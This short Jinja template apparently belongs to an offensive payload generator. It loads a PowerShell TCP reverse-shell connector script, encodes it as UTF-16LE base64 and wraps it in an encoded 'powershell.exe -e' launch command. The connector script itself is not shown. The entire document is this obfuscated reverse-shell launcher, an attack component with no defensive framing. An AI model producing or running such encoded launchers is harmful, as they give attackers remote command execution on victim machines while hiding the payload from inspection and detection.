{% import 'reverse/connector/powershell-tcp.ps1' as payload with context -%}
powershell.exe -e {{ payload|utf16le|base64 }}
